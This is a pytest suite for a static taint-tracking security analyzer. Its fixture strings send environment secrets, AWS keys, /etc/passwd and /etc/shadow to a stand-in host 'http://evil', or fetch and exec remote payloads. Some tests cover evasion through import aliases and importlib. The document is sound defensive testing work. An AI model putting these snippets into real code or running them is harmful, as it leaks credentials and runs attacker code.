# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for behavioral_taint_tracking analyzer (TT1–TT5): source→sink data-flow."""

from __future__ import annotations

import json
import sys
import textwrap
import time
import tracemalloc
import types

import pytest

from skillspector.nodes.analyzers import behavioral_taint_tracking
from skillspector.nodes.analyzers.common import build_type_map
from skillspector.nodes.deduplicate import deduplicate
from skillspector.python_ast import get_python_ast
from skillspector.state import WorkflowResourceBudget


def _run(code: str, filename: str = "script.py") -> list:
    state = {
        "components": [filename],
        "file_cache": {filename: code},
    }
    result = behavioral_taint_tracking.node(state)
    return result["findings"]


def _rule_ids(findings: list) -> set[str]:
    return {f.rule_id for f in findings}


# ── TT3: Credential source → network sink ──────────────────────────────


class TestCredentialExfiltration:
    def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
        call = 'requests.post("http://evil", data=secret)'
        code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'

        tt3 = [finding for finding in _run(code) if finding.rule_id == "TT3"]

        assert len(tt3) == 2
        assert len({finding.fingerprint() for finding in tt3}) == 1
        assert len({finding.start_column for finding in tt3}) == 2
        compacted = deduplicate(tt3)
        assert len(compacted) == 1
        assert len(compacted[0].occurrences) == 2

    def test_long_taint_sink_uses_complete_source_identity(self):
        def code(tail: str) -> str:
            shared_headers = "\n".join(
                f'        "header-{index}": "{"a" * 80}",' for index in range(5)
            )
            return (
                "import os, requests\n"
                'secret = os.environ.get("KEY")\n'
                "requests.post(\n"
                '    "https://example.invalid",\n'
                "    data=secret,\n"
                "    headers={\n"
                f"{shared_headers}\n"
                f'        "tail": "{tail}",\n'
                "    },\n"
                ")\n"
            )

        first_code = code("UNIQUE_FIRST_TAIL")
        second_code = code("UNIQUE_SECOND_TAIL")
        first = next(f for f in _run(first_code, "first.py") if f.rule_id == "TT3")
        second = next(f for f in _run(second_code, "second.py") if f.rule_id == "TT3")

        assert first.matched_text == second.matched_text
        assert len(first.matched_text or "") == 200
        assert first.fingerprint() != second.fingerprint()
        assert len(deduplicate([first, second])) == 2
        assert "UNIQUE_FIRST_TAIL" not in json.dumps(first.to_dict(), sort_keys=True)

    def test_direct_environ_to_requests_post(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1
        assert tt3[0].severity == "CRITICAL"

    def test_variable_mediated_environ_to_post(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("API_KEY")\n'
            'requests.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1
        assert "secret" in tt3[0].message or "API_KEY" in tt3[0].message

    def test_environ_subscript_to_network(self):
        code = (
            "import os, requests\n"
            'token = os.environ["SECRET_TOKEN"]\n'
            'requests.post("http://evil", headers={"Auth": token})\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_getenv_to_httpx(self):
        code = (
            "import os, httpx\n"
            'key = os.getenv("KEY")\n'
            'httpx.post("http://evil", json={"key": key})\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1


# ── Inline urllib opener network sinks ────────────────────────────────


class TestInlineUrllibOpener:
    """Inline and stored urllib openers follow existing name-based sink policy."""

    @pytest.mark.parametrize(
        ("imports", "factory"),
        [
            ("import urllib.request", "urllib.request.build_opener"),
            ("import urllib.request as ur", "ur.build_opener"),
            ("from urllib import request as ur", "ur.build_opener"),
            ("from urllib.request import build_opener as make", "make"),
        ],
    )
    @pytest.mark.parametrize("payload", ["request", "direct", "variable"])
    def test_credential_to_inline_opener(self, imports, factory, payload):
        prefix = f"import os\n{imports}\n"
        if payload == "request":
            # .get() isolates the missing sink from the separate nested-subscript gap.
            prefix += (
                "import urllib.request\n"
                'req = urllib.request.Request("https://example.invalid", '
                'headers={"Authorization": "Bearer " + os.environ.get("KEY")})\n'
            )
            args = "req"
        elif payload == "direct":
            args = '"https://example.invalid", data=os.getenv("KEY")'
        else:
            prefix += 'secret = os.environ["KEY"]\n'
            args = '"https://example.invalid", data=secret'
        findings = _run(prefix + f"{factory}().open({args})\n")
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) == 1
        assert tt3[0].severity == "CRITICAL"
        assert tt3[0].file == "script.py"
        assert tt3[0].start_line == len(prefix.splitlines()) + 1
        assert "build_opener.open" in tt3[0].message
        assert f"{factory}().open" in tt3[0].matched_text

    def test_handler_arguments_keep_the_network_sink(self):
        code = (
            "import os, urllib.request\n"
            "class NoRedirect(urllib.request.HTTPRedirectHandler):\n"
            "    def redirect_request(self, *args):\n"
            "        return None\n"
            "urllib.request.build_opener(NoRedirect()).open(\n"
            '    "https://example.invalid", data=os.getenv("KEY"))\n'
        )
        assert "TT3" in _rule_ids(_run(code))

    def test_file_data_to_inline_opener_is_tt4(self):
        code = (
            "import urllib.request\n"
            'data = open("private.txt").read()\n'
            'urllib.request.build_opener().open("https://example.invalid", data=data)\n'
        )
        assert "TT4" in _rule_ids(_run(code))

    @pytest.mark.parametrize(
        "call",
        [
            'urllib.request.build_opener().open("https://example.invalid")',
            'urllib.request.build_opener().open("https://example.invalid", data=b"public")',
            'urllib.request.build_opener().close(os.getenv("KEY"))',
            'open("local.txt", "w").write(os.getenv("KEY"))',
            'Fake().open(os.getenv("KEY"))',
        ],
    )
    def test_other_open_methods_and_public_payloads_are_not_tt3(self, call):
        code = "import os, urllib.request\n" + call + "\n"
        assert "TT3" not in _rule_ids(_run(code))

    @pytest.mark.parametrize("stored", [False, True])
    @pytest.mark.parametrize(
        ("imports", "factory"),
        [
            ("import urllib.request", "urllib.request.build_opener"),
            ("import urllib.request as ur", "ur.build_opener"),
            ("from urllib import request as ur", "ur.build_opener"),
            ("from urllib.request import build_opener as make", "make"),
        ],
    )
    def test_stored_and_inline_opener_aliases(self, imports, factory, stored):
        prefix = f"import os\n{imports}\n"
        if stored:
            prefix += f"opener = {factory}()\n"
            call = "opener.open"
        else:
            call = f"{factory}().open"
        assert "TT3" in _rule_ids(_run(prefix + f'{call}(os.getenv("KEY"))\n'))

    @pytest.mark.parametrize(
        "code",
        [
            'import os\ndef send():\n    import urllib.request\n    urllib.request.build_opener().open(os.getenv("KEY"))\n',
            'import os, urllib.request\ndef helper():\n    import urllib.parse\nurllib.request.build_opener().open(os.getenv("KEY"))\n',
            'import os\nfrom urllib import request\ndef handle(request):\n    pass\nrequest.build_opener().open(os.getenv("KEY"))\n',
            'import os\nif __name__ == "__main__":\n    import urllib.request\n    urllib.request.build_opener().open(os.getenv("KEY"))\n',
            'import os, urllib.request\nurllib.request.HTTPRedirectHandler.max_repeats = 2\nurllib.request.build_opener().open(os.getenv("KEY"))\n',
            'import os, urllib.request\ndef unused(urllib=None):\n    pass\nurllib.request.build_opener().open(os.getenv("KEY"))\n',
            'import os\ndef send():\n    urllib.request.build_opener().open(os.getenv("KEY"))\nimport urllib.request\n',
        ],
    )
    def test_ordinary_import_layouts_do_not_disable_sink(self, code):
        assert "TT3" in _rule_ids(_run(code))

    @pytest.mark.parametrize("stored", [False, True])
    @pytest.mark.parametrize(
        ("payload", "rule"),
        [
            ('data=os.getenv("KEY")', "TT3"),
            ('data=open("private.txt").read()', "TT4"),
            ('data=b"public"', None),
        ],
    )
    def test_inline_and_stored_payloads_agree(self, stored, payload, rule):
        code = "import os, urllib.request\n"
        if stored:
            code += "opener = urllib.request.build_opener()\n"
            call = "opener.open"
        else:
            call = "urllib.request.build_opener().open"
        findings = _run(code + f'{call}("https://example.invalid", {payload})\n')
        if rule:
            assert rule in _rule_ids(findings)
        else:
            assert not {"TT3", "TT4"} & _rule_ids(findings)

    def test_unrelated_stored_factory_is_not_a_network_sink(self):
        assert "TT3" not in _rule_ids(
            _run('import os\nopener = Fake()\nopener.open(os.getenv("KEY"))\n')
        )

    @pytest.mark.parametrize(
        "prefix",
        [
            "def build_opener():\n    return Fake()\n",
            "from other_module import build_opener\n",
        ],
    )
    def test_unrelated_factory_is_not_a_network_sink(self, prefix):
        assert "TT3" not in _rule_ids(
            _run("import os\n" + prefix + 'build_opener().open(os.getenv("KEY"))\n')
        )

    def test_same_line_occurrences_keep_separate_locations(self):
        call = 'urllib.request.build_opener().open("https://example.invalid", data=secret)'
        code = 'import os, urllib.request\nsecret = os.getenv("KEY")\n' + f"{call}; {call}\n"
        findings = [f for f in _run(code) if f.rule_id == "TT3"]
        assert len(findings) == 2
        assert len({f.start_column for f in findings}) == 2

    def test_direct_urlopen_control_still_reports_request_payload(self):
        code = (
            "import os, urllib.request\n"
            'req = urllib.request.Request("https://example.invalid", '
            'headers={"Authorization": os.getenv("KEY")})\n'
            "urllib.request.urlopen(req)\n"
        )
        assert "TT3" in _rule_ids(_run(code))

    @pytest.mark.parametrize("stored", [False, True])
    @pytest.mark.parametrize("credential", ["os.getenv('KEY')", "secret"])
    def test_handler_credentials_follow_existing_sink_policy(self, credential, stored):
        code = (
            "import os, urllib.request\n"
            "class Leak(urllib.request.BaseHandler):\n"
            "    def __init__(self, value):\n"
            "        self.value = value\n"
            "    def http_request(self, req):\n"
            "        req.add_header('Authorization', self.value)\n"
            "        return req\n"
            "secret = os.getenv('KEY')\n"
        )
        factory = f"urllib.request.build_opener(Leak({credential}))"
        if stored:
            code += f"opener = {factory}\n"
            call = "opener.open"
        else:
            call = f"{factory}.open"
        assert "TT3" in _rule_ids(_run(code + f"{call}('https://example.invalid')\n"))

    def test_keyword_request_argument_is_checked(self):
        code = (
            "import os, urllib.request\n"
            'req = urllib.request.Request("https://example.invalid", '
            'headers={"Authorization": os.getenv("KEY")})\n'
            "urllib.request.build_opener().open(fullurl=req)\n"
        )
        assert "TT3" in _rule_ids(_run(code))


# ── TT4: File read → network sink ──────────────────────────────────────


class TestFileExfiltration:
    def test_open_read_to_requests(self):
        code = (
            "import requests\n"
            'data = open("/etc/passwd").read()\n'
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        tt4 = [f for f in findings if f.rule_id == "TT4"]
        assert len(tt4) >= 1
        assert tt4[0].severity == "HIGH"

    def test_open_write_not_a_source(self):
        """open() in write mode should not be treated as a source."""
        code = 'import requests\nf = open("out.txt", "w")\nrequests.post("http://evil", data=f)\n'
        findings = _run(code)
        tt4 = [f for f in findings if f.rule_id == "TT4"]
        assert len(tt4) == 0


# ── TT5: External input → exec sink ────────────────────────────────────


class TestExternalInputToExec:
    def test_input_to_eval(self):
        code = "cmd = input()\neval(cmd)\n"
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1
        assert tt5[0].severity == "CRITICAL"

    def test_requests_get_to_exec(self):
        code = 'import requests\ncode = requests.get("http://evil/payload").text\nexec(code)\n'
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1

    def test_direct_input_to_os_system(self):
        code = 'import os\nos.system(input("cmd: "))'
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1

    def test_network_to_subprocess(self):
        code = (
            "import requests, subprocess\n"
            'payload = requests.get("http://evil").text\n'
            "subprocess.run(payload, shell=True)\n"
        )
        findings = _run(code)
        tt5 = [f for f in findings if f.rule_id == "TT5"]
        assert len(tt5) >= 1


# ── TT6: External / file input → deserialization sink ──────────────────


class TestUntrustedDeserialization:
    def test_network_to_pickle_loads(self):
        code = (
            "import requests, pickle\n"
            'blob = requests.get("http://evil/payload").content\n'
            "obj = pickle.loads(blob)\n"
        )
        findings = _run(code)
        tt6 = [f for f in findings if f.rule_id == "TT6"]
        assert len(tt6) >= 1
        assert tt6[0].severity == "HIGH"
        assert "deserialization" in tt6[0].message

    def test_file_read_to_pickle_load(self):
        code = 'import pickle\nobj = pickle.load(open("bundled.pkl", "rb"))\n'
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_user_input_to_pickle_loads(self):
        code = "import pickle\npickle.loads(input())\n"
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_network_to_yaml_unsafe_load(self):
        code = (
            "import requests, yaml\n"
            'data = requests.get("http://evil").text\n'
            "yaml.unsafe_load(data)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT6" for f in findings)

    def test_constant_argument_no_tt6(self):
        code = 'import pickle\npickle.loads(b"\\x80\\x04constant")\n'
        findings = _run(code)
        assert not any(f.rule_id == "TT6" for f in findings)


# ── TT1: Direct source-to-sink (generic) ───────────────────────────────


class TestDirectFlow:
    def test_open_read_to_exec(self):
        code = 'exec(open("payload.py").read())'
        findings = _run(code)
        rule_ids = _rule_ids(findings)
        assert "TT1" in rule_ids or "TT5" in rule_ids

    def test_environ_to_eval(self):
        code = 'import os\neval(os.environ.get("CODE"))'
        findings = _run(code)
        assert any(f.rule_id in ("TT1", "TT5") for f in findings)


# ── TT2: Variable-mediated (generic) ───────────────────────────────────


class TestTaintPropagation:
    def test_reassignment_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "data = secret\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_dict_construction_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            'payload = {"key": secret}\n'
            'requests.post("http://evil", json=payload)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_list_construction_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "items = [secret]\n"
            'requests.post("http://evil", json=items)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_fstring_propagates_taint(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            'msg = f"token={secret}"\n'
            'requests.post("http://evil", data=msg)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_multi_hop_propagation(self):
        code = (
            "import os, requests\n"
            'secret = os.environ.get("KEY")\n'
            "a = secret\n"
            "b = a\n"
            'requests.post("http://evil", data=b)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_untainted_reassignment_no_finding(self):
        code = 'import requests\nx = 42\ny = x\nrequests.post("http://example.com", data=y)\n'
        findings = _run(code)
        assert not any(f.rule_id == "TT3" for f in findings)


class TestVariableMediatedFlow:
    def test_method_call_on_file_object_not_tracked(self):
        """f.write() is a method call on a variable — not a recognized sink."""
        code = 'data = open("secret.txt").read()\nf = open("exfil.txt", "w")\nf.write(data)\n'
        findings = _run(code)
        assert isinstance(findings, list)

    def test_doubly_nested_source_before_shallower_sink_is_tracked(self):
        """A source assigned two AST levels deeper than its sink must still flow.

        The analyzer walks the module once, recording each source assignment
        into a `tainted` dict and consulting it at sink call sites. Walking in
        AST breadth-first order (as `ast.walk` does) visits a sink nested one
        level shallower than its source BEFORE the source assignment, even
        though the assignment appears earlier in the source text — the taint
        lookup then finds nothing and a real credential-exfiltration flow is
        silently dropped. This is the natural shape of an env var read inside
        a guarded/nested block and exfiltrated at module level afterwards.
        """
        code = (
            "import os, requests\n"
            "if True:\n"
            "    if True:\n"
            '        secret = os.environ.get("API_KEY")\n'
            'requests.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        assert len(tt3) >= 1

    def test_function_defined_before_module_level_source_is_tracked(self):
        """A sink inside a function DEFINED before its source must still flow.

        The function body only runs when called, after the later assignment
        has already executed — order in the file is not execution order.
        """
        code = (
            "import os, requests\n"
            "def send():\n"
            "    requests.post('http://evil', data=API_KEY)\n"
            'API_KEY = os.environ["API_KEY"]\n'
            "send()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_helper_called_from_main_after_source_read_is_tracked(self):
        """A sink in a helper called from main(), after main() reads the source."""
        code = (
            "import os, requests\n"
            "def upload(payload):\n"
            "    requests.post('http://evil', data=payload)\n"
            "def main():\n"
            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
            "    upload(payload)\n"
            "main()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_helper_called_under_main_guard_is_tracked(self):
        """Same shape as above, guarded by `if __name__ == "__main__":`."""
        code = (
            "import os, requests\n"
            "def upload(payload):\n"
            "    requests.post('http://evil', data=payload)\n"
            'if __name__ == "__main__":\n'
            '    payload = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
            "    upload(payload)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_method_using_module_global_assigned_later_is_tracked(self):
        """A method reads a module global that is assigned after the class body."""
        code = (
            "import os, requests\n"
            "class Uploader:\n"
            "    def send(self):\n"
            "        requests.post('http://evil', data=API_KEY)\n"
            'API_KEY = os.environ["API_KEY"]\n'
            "Uploader().send()\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_loop_carried_source_read_after_sink_in_body_is_tracked(self):
        """A sink in a loop body, above the source read it consumes next iteration."""
        code = (
            "import os, requests\n"
            "secret = None\n"
            "for _ in range(2):\n"
            "    requests.post('http://evil', data=secret)\n"
            '    secret = os.environ["API_KEY"]\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)


# ── Edge cases ──────────────────────────────────────────────────────────


class TestEdgeCases:
    def test_non_python_skipped(self):
        state = {
            "components": ["readme.md"],
            "file_cache": {"readme.md": 'exec(os.environ.get("X"))'},
        }
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_syntax_error_skipped(self):
        findings = _run("def broken(\n")
        assert findings == []

    def test_empty_file(self):
        findings = _run("")
        assert findings == []

    def test_safe_code_no_findings(self):
        code = "import json\ndata = json.loads('{}')\nprint(data)\n"
        findings = _run(code)
        assert findings == []

    def test_empty_components(self):
        state = {"components": [], "file_cache": {}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_missing_file_in_cache(self):
        state = {"components": ["missing.py"], "file_cache": {}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_oversized_file_skipped(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        big = 'import os\nexec(os.environ.get("KEY"))\n' + ("x = 1\n" * MAX_FILE_CHARS)
        state = {"components": ["big.py"], "file_cache": {"big.py": big}}
        result = behavioral_taint_tracking.node(state)
        assert result["findings"] == []

    def test_exact_character_limit_scanned(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        prefix = 'import os\nexec(os.environ.get("KEY"))\n'
        code = prefix + (" " * (MAX_FILE_CHARS - len(prefix)))
        assert len(code) == MAX_FILE_CHARS
        assert _rule_ids(_run(code))

    def test_multibyte_under_char_limit_scanned(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        prefix = 'import os\nexec(os.environ.get("KEY"))\n# '
        code = prefix + ("🦄" * 250_000)
        assert len(code) <= MAX_FILE_CHARS
        assert len(code.encode("utf-8")) > MAX_FILE_CHARS
        assert _rule_ids(_run(code))

    def test_oversized_file_does_not_stop_later_components(self):
        from skillspector.nodes.analyzers.static_runner import MAX_FILE_CHARS

        big = 'import os\nexec(os.environ.get("KEY"))\n' + ("x = 1\n" * MAX_FILE_CHARS)
        small = 'import os\nexec(os.environ.get("KEY"))\n'
        state = {
            "components": ["big.py", "small.py"],
            "file_cache": {"big.py": big, "small.py": small},
        }

        result = behavioral_taint_tracking.node(state)
        files = {f.file for f in result["findings"]}
        assert "big.py" not in files
        assert "small.py" in files

    def test_multiple_files_produce_findings(self):
        state = {
            "components": ["a.py", "b.py"],
            "file_cache": {
                "a.py": 'import os, requests\nrequests.post("http://evil", data=os.environ.get("K"))',
                "b.py": "cmd = input()\neval(cmd)\n",
            },
        }
        result = behavioral_taint_tracking.node(state)
        files = {f.file for f in result["findings"]}
        assert "a.py" in files
        assert "b.py" in files

    def test_finding_has_context(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].context is not None

    def test_finding_has_matched_text(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].matched_text is not None

    def test_finding_has_remediation(self):
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        assert findings[0].remediation is not None
        assert len(findings[0].remediation) > 0


# ── Multiple findings ───────────────────────────────────────────────────


class TestMultipleFindings:
    def test_multiple_flows_in_one_file(self):
        code = (
            "import os, requests, subprocess\n"
            'secret = os.environ.get("KEY")\n'
            'requests.post("http://evil", data=secret)\n'
            "cmd = input()\n"
            "subprocess.run(cmd, shell=True)\n"
        )
        findings = _run(code)
        rule_ids = _rule_ids(findings)
        assert "TT3" in rule_ids
        assert "TT5" in rule_ids

    def test_dedup_same_line(self):
        """Same rule+line should not produce duplicate findings."""
        code = 'import os, requests\nrequests.post("http://evil", data=os.environ.get("KEY"))'
        findings = _run(code)
        tt3 = [f for f in findings if f.rule_id == "TT3"]
        lines = [f.start_line for f in tt3]
        assert len(lines) == len(set(lines))


# ── Import-alias evasion ──────────────────────────────────────────────


class TestImportAliasEvasion:
    """Source/sink resolution must survive ``from ... import`` and ``import ... as``.

    Fully-qualified set membership (e.g. ``"subprocess.run"``) otherwise misses any
    locally aliased spelling, letting a skill hide an exfiltration/exec flow.
    """

    def test_from_subprocess_import_run_as_exec_sink(self):
        code = "from subprocess import run\ncmd = input()\nrun(cmd, shell=True)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_aliased_credential_to_aliased_network(self):
        code = (
            "import os as o\n"
            "import requests as r\n"
            'secret = o.getenv("KEY")\n'
            'r.post("http://evil", data=secret)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_aliased_environ_subscript_to_network(self):
        code = (
            "import os as o\n"
            "import requests\n"
            'token = o.environ["SECRET"]\n'
            'requests.post("http://evil", data=token)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_aliased_network_input_to_exec(self):
        code = 'import requests as r\ncode = r.get("http://evil/payload").text\nexec(code)\n'
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_aliased_safe_flow_no_false_positive(self):
        code = (
            "import json as j\n"
            "import requests as r\n"
            'cfg = j.loads("{}")\n'
            'r.post("http://example.com", json=cfg)\n'
        )
        findings = _run(code)
        assert findings == []


# ── Type-aware instance-method resolution ─────────────────────────────


class TestTypeAwareResolution:
    def test_pathlib_read_text_as_source(self):
        """pathlib.Path(...).read_text() should be detected as a file-read source."""
        code = (
            "import pathlib, requests\n"
            'p = pathlib.Path("/etc/passwd")\n'
            "data = p.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_pathlib_read_bytes_as_source(self):
        code = (
            "import pathlib, requests\n"
            'p = pathlib.Path("/etc/shadow")\n'
            "data = p.read_bytes()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_socket_recv_as_source(self):
        """socket.socket().recv() should be detected as a network-input source."""
        code = "import socket\nsock = socket.socket()\ndata = sock.recv(4096)\neval(data)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_socket_send_as_sink(self):
        """socket.socket().send() should be detected as a network-output sink."""
        code = (
            "import os, socket\n"
            'secret = os.environ.get("KEY")\n'
            "sock = socket.socket()\n"
            "sock.send(secret.encode())\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_pathlib_write_text_as_sink(self):
        code = (
            "import os, pathlib\n"
            'secret = os.environ.get("KEY")\n'
            'p = pathlib.Path("out.txt")\n'
            "p.write_text(secret)\n"
        )
        findings = _run(code)
        assert any(f.rule_id in ("TT1", "TT2") for f in findings)

    def test_from_import_pathlib(self):
        """``from pathlib import Path`` should resolve p.read_text() correctly."""
        code = (
            "from pathlib import Path\n"
            "import requests\n"
            'p = Path("/etc/passwd")\n'
            "data = p.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert any(f.rule_id == "TT4" for f in findings)

    def test_from_import_socket(self):
        """``from socket import socket`` should resolve s.recv() correctly."""
        code = "from socket import socket\ns = socket()\ndata = s.recv(4096)\neval(data)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_with_statement_socket(self):
        """``with socket.socket() as sock:`` should infer type for sock."""
        code = (
            "import os, socket\n"
            'secret = os.environ.get("KEY")\n'
            "with socket.socket() as sock:\n"
            "    sock.send(secret.encode())\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT3" for f in findings)

    def test_untyped_variable_no_false_positive(self):
        """Method calls on untyped variables should not produce false matches."""
        code = (
            "import requests\n"
            "x = some_function()\n"
            "data = x.read_text()\n"
            'requests.post("http://evil", data=data)\n'
        )
        findings = _run(code)
        assert not any(f.rule_id == "TT4" for f in findings)


# ── builtins / importlib exec-sink evasion ────────────────────────────


class TestBuiltinsImportlibSinkEvasion:
    """Exec sinks reached via ``builtins.*`` or ``importlib.import_module`` must alert.

    ``_EXEC_SINKS`` matches by bare/qualified name (``"exec"``, ``"os.system"``).
    ``from builtins import exec`` resolves to ``builtins.exec`` (collapsed back to
    ``exec``) and ``importlib.import_module('subprocess').run`` resolves to the
    canonical ``subprocess.run`` — both must re-enter the exec-sink path so a
    user-input → exec flow is flagged as TT5. Complements the ``getattr`` branch
    (PR #166): this covers the import/builtins/importlib branch.
    """

    def test_from_builtins_import_exec_sink(self):
        """``from builtins import exec`` with tainted input must raise TT5."""
        code = "from builtins import exec\ncode = input()\nexec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_import_builtins_dot_exec_sink(self):
        """``import builtins; builtins.exec(input())`` must raise TT5."""
        code = "import builtins\ncode = input()\nbuiltins.exec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_import_builtins_as_alias_sink(self):
        """``import builtins as b2; b2.exec(input())`` must raise TT5."""
        code = "import builtins as b2\ncode = input()\nb2.exec(code)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_import_module_os_system_sink(self):
        """``importlib.import_module('os').system(input())`` must raise TT5."""
        code = "import importlib\ncmd = input()\nimportlib.import_module('os').system(cmd)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_import_module_subprocess_run_sink(self):
        """``importlib.import_module('subprocess').run(input())`` must raise TT5."""
        code = "import importlib\ncmd = input()\nimportlib.import_module('subprocess').run(cmd)\n"
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_from_importlib_import_module_sink(self):
        """Bare-imported ``import_module('os').system(input())`` must raise TT5."""
        code = (
            "from importlib import import_module\ncmd = input()\nimport_module('os').system(cmd)\n"
        )
        findings = _run(code)
        assert any(f.rule_id == "TT5" for f in findings)

    def test_importlib_benign_module_no_false_positive(self):
        """A benign dynamic import (``json.loads``) must not be treated as an exec sink."""
        code = "import importlib\ndata = input()\nimportlib.import_module('json').loads(data)\n"
        findings = _run(code)
        assert not any(f.rule_id == "TT5" for f in findings)


class TestInspectionLedgerResponse:
    def test_syntax_error_is_a_nonfatal_skipped_work_item(self) -> None:
        result = behavioral_taint_tracking.node(
            {
                "components": ["broken.py", "README.md"],
                "file_cache": {"broken.py": "def broken(:\n", "README.md": "# docs\n"},
            }
        )

        assert [event["path"] for event in result["inspection_ledger"]] == ["broken.py"]
        assert result["inspection_ledger"][0]["reason_code"] == "syntax_error"
        assert result["analyzer_status_events"][0]["status"] == "degraded"


class TestResourceBounds:
    @staticmethod
    def _flows(prefix: str, count: int) -> str:
        return "\n".join(
            f"{prefix}{index} = input()\nexec({prefix}{index})" for index in range(count)
        )

    def test_finding_caps_stop_construction_and_account_remaining_work(self, monkeypatch) -> None:
        monkeypatch.setattr(behavioral_taint_tracking, "MAX_FINDINGS_PER_ARTIFACT", 2)
        monkeypatch.setattr(behavioral_taint_tracking, "MAX_FINDINGS_PER_ANALYZER", 3)
        result = behavioral_taint_tracking.node(
            {
                "components": ["a.py", "b.py", "c.py"],
                "file_cache": {
                    "a.py": self._flows("a", 4),
                    "b.py": self._flows("b", 2),
                    "c.py": self._flows("c", 1),
                },
            }
        )

        assert len(result["findings"]) == 3
        assert [event["outcome"] for event in result["inspection_ledger"]] == [
            "partial",
            "partial",
            "partial",
        ]
        assert result["inspection_ledger"][0]["limit_findings"] == 2
        assert result["inspection_ledger"][1]["limit_findings"] == 3
        assert result["inspection_ledger"][2]["emitted_finding_ids"] == []
        assert result["analyzer_status_events"][0]["status"] == "degraded"

